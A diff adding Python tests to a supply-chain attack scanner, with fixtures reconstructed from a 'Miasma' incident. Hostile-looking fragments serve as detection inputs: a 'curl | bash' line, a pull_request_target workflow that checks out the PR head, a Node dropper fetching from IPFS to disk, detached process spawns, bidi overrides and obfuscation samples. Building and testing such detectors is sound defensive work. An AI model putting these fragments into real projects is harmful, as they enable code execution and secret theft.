@@ -92,3 +92,104 @@ def test_evidence_is_bounded():
     big = "curl http://x | bash " + "A" * 5000
     hits = scan_indicators(big)
     assert all(len(h.evidence) <= 240 for h in hits)
+
+
+# ── the Miasma families: workflow CONFIG, diff-presentation evasion, Node execution ──────────────────
+# Reconstructed from the AsyncAPI "Miasma" writeup, where 7 of 8 stages ran silently past this suite.
+# Every rule below is paired with its NEGATIVE case, because the tuning (what stays sub-floor) is as
+# load-bearing as the detection — a monotone-paranoid suite forces a signal on ordinary changes.
+
+_PWN = ("on:\n  pull_request_target:\n    types: [opened]\njobs:\n  p:\n    steps:\n"
+        "      - uses: actions/checkout@v4\n        with:\n"
+        "          ref: ${{ github.event.pull_request.head.sha }}\n")
+_LABEL_BOT = "on:\n  pull_request_target:\n    types: [opened]\njobs:\n  l:\n    steps:\n      - uses: actions/labeler@v5\n"
+
+
+def test_pwn_request_is_critical_but_bare_privileged_trigger_is_sub_floor():
+    """The root cause of Miasma. `pull_request_target` PLUS a PR-head checkout runs attacker code with
+    the base repo's secrets → `critical`. The SAME trigger without that checkout is the ordinary
+    label/comment-bot shape → `medium`, below the floor, so a labeler PR never forces a signal."""
+    pwn = [h for h in scan_indicators(_PWN) if h.rule == "pwn-request"]
+    assert pwn and pwn[0].severity == "critical"
+
+    bot = scan_indicators(_LABEL_BOT)
+    assert "pwn-request" not in _rules(bot)
+    trig = [h for h in bot if h.rule == "privileged-fork-trigger"]
+    assert trig and trig[0].severity == "medium"
+
+
+def test_detects_whitespace_shove_wherever_it_sits():
+    """Miasma PREPENDED ~700 spaces to push the payload off the diff viewport. A run that size mid-line
+    conceals just as well, so the rule is not line-anchored — but ordinary indentation must stay silent."""
+    assert "diff-viewport-evasion" in _rules(scan_indicators("+" + " " * 700 + "grantAll();"))
+    assert "diff-viewport-evasion" in _rules(scan_indicators("+const a = 1;" + " " * 700 + "grantAll();"))
+    assert "diff-viewport-evasion" not in _rules(scan_indicators("+" + " " * 40 + "deeply_indented()"))
+
+
+def test_detects_bidi_override_but_not_legitimate_invisibles():
+    """Trojan Source: a bidi override makes the rendered diff differ from the compiled code. LRM/RLM and
+    the emoji ZWJ are DELIBERATELY excluded — they carry real linguistic/emoji use in ordinary prose."""
+    assert "invisible-unicode" in _rules(scan_indicators("if (isAdmin /*\u202e } \u2066*/) {"))
+    assert "invisible-unicode" in _rules(scan_indicators("const a\u200b = 1;"))
+    assert "invisible-unicode" not in _rules(scan_indicators("\U0001f468\u200d\U0001f469 team \u200fشكرا"))
+
+
+def test_detached_spawn_needs_both_halves():
+    """`child_process` is everywhere in legitimate tooling and `detached` alone is meaningless — it is
+    the PAIR (a process deliberately outliving its parent) that is the stage-1 loader shape."""
+    both = "const cp = require('child_process');\ncp.spawn(p, a, {detached: true}).unref();\n"
+    hit = [h for h in scan_indicators(both) if h.rule == "detached-process-spawn"]
+    assert hit and hit[0].severity == "high"
+    assert "detached-process-spawn" not in _rules(scan_indicators("const cp = require('child_process');\ncp.execSync('ls');"))
+    assert "detached-process-spawn" not in _rules(scan_indicators("worker = {detached: true};"))
+
+
+def test_remote_fetch_to_disk_needs_both_halves():
+    """Every HTTP client fetches and every build writes files; TOGETHER in one change they are a stage-2
+    dropper — which is how Miasma pulled its payload off IPFS and dropped it as `sync.js`."""
+    dropper = ("require('https').get('https://ipfs.io/ipfs/QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco',\n"
+               "  r => r.pipe(require('fs').createWriteStream(dst)));\n")
+    assert "remote-fetch-to-disk" in _rules(scan_indicators(dropper))
+    assert "remote-fetch-to-disk" not in _rules(scan_indicators("const r = await fetch('/v1/runs');"))
+    assert "remote-fetch-to-disk" not in _rules(scan_indicators("fs.writeFileSync(out, JSON.stringify(x));"))
+
+
+def test_inline_node_exec_and_sub_floor_dynamic_eval():
+    """`node -e` executes a string as a program → high. A bare `eval`/`new Function` is common in real
+    build tooling, so it stays a sub-floor corroborator rather than a standalone signal."""
+    assert "inline-code-exec" in _rules(scan_indicators("run: node -e \"require('./x')\""))
+    ev = [h for h in scan_indicators("const cfg = new Function('env', body)(process.env.NODE_ENV);")
+          if h.rule == "dynamic-code-eval"]
+    assert ev and ev[0].severity == "medium"
+
+
+def test_hex_mangled_identifiers_need_a_real_cluster():
+    """javascript-obfuscator's `_0x…` mangling — the obfuscation shape base64 detection cannot see (it
+    is what Miasma injected into `validator.js`). One stray `_0x` name is not obfuscation."""
+    obf = ("var _0x1dd48b=_0x2f1a9c(_0x4c2b7d,_0x1dd2ef);"
+           "var _0x2f1a9c=function(_0x4c2b7d,_0x1dd2ef){return _0x4c2b7d+_0x1dd2ef;};")
+    hit = [h for h in scan_indicators(obf) if h.rule == "obfuscated-identifiers"]
+    assert hit and hit[0].severity == "high"
+    # A stray hex-looking name is not obfuscation, and neither is a handful — the rule wants a real
+    # cluster (>=3 distinct AND >=8 uses), so a single mangled constant in ordinary code stays silent.
+    assert "obfuscated-identifiers" not in _rules(scan_indicators("const _0xdeadbeef = 1;"))
+    assert "obfuscated-identifiers" not in _rules(
+        scan_indicators("const _0xaaaa = 1, _0xbbbb = 2, _0xcccc = 3;"))
+
+
+def test_content_addressed_host_is_a_sub_floor_corroborator():
+    """IPFS/permaweb gateways have mainstream legitimate use (web3, NFT metadata), so a bare reference
+    is `medium` like the dev tunnels. The DROPPER rule above is what carries the signal."""
+    hit = [h for h in scan_indicators("Artifacts mirror to https://ipfs.io/ipfs/<cid> for archival.")
+           if h.rule == "content-addressed-host"]
+    assert hit and hit[0].severity == "medium"
+
+
+def test_base64_deobfuscation_reaches_the_js_primitives():
+    """The de-obfuscation rescan must see Node execution too, not just shell — otherwise wrapping the
+    dropper in base64 walks straight past the floor."""
+    import base64
+
+    blob = base64.b64encode(b"require('child_process').spawn(p,a,{detached: true}).unref()").decode()
+    obf = [h for h in scan_indicators(f"const s = '{blob}';") if h.rule == "obfuscated-payload"]
+    assert obf and obf[0].severity == "high"
